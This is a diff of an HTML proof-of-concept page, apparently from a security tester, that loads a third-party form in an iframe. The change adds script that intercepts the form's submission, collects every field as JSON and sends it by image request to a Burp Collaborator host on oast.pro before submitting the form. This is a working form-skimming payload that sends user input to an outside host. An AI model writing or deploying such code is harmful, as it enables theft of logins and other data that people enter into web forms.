@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Load Form and Capture Response</title>
+    <title>Load Form and Capture Redirection</title>
     <style>
         iframe {
             border: none;
@@ -13,22 +13,41 @@
     </style>
 </head>
 <body>
-    <iframe src="https://drwhitehack.github.io/Test/"></iframe>
+    <iframe id="formFrame" src="https://drwhitehack.github.io/Test/"></iframe>
     <script>
-        // Function to capture response
-        function captureResponse(response) {
-            // Send the response to the Burp Suite collaborator
+        // Function to capture form data before redirection
+        function captureFormData(formData) {
+            // Send the form data to the Burp Suite collaborator
             var img = new Image();
-            img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?response=" + encodeURIComponent(response);
+            img.src = "http://co4n42didn6kb1bavvhgvsichixfygpwj.oast.pro?formData=" + encodeURIComponent(formData);
         }
 
-        // Listen for messages from the iframe
-        window.addEventListener('message', function(event) {
-            if (event.origin === 'https://drwhitehack.github.io/Test/') { // Replace with the origin of your form page
-                var response = event.data;
-                captureResponse(response);
-            }
-        });
+        // Function to intercept form submission event within the iframe
+        function interceptFormSubmission() {
+            var iframe = document.getElementById('formFrame');
+            // Listen for form submission event within the iframe
+            iframe.contentWindow.document.querySelector('form').addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent the form from being submitted
+                var formData = new FormData(event.target); // Extract form data
+                var formDataObject = {};
+                // Convert FormData object to JSON object
+                formData.forEach(function(value, key){
+                    formDataObject[key] = value;
+                });
+                var formDataJSON = JSON.stringify(formDataObject); // Convert JSON object to JSON string
+                // Capture form data before redirection
+                captureFormData(formDataJSON);
+                // Perform form submission (if needed)
+                setTimeout(function() {
+                    event.target.submit();
+                }, 1000); // Adjust the delay as needed
+            });
+        }
+
+        // Call the function to intercept form submission when the page loads
+        window.onload = function() {
+            interceptFormSubmission();
+        };
     </script>
 </body>
 </html>
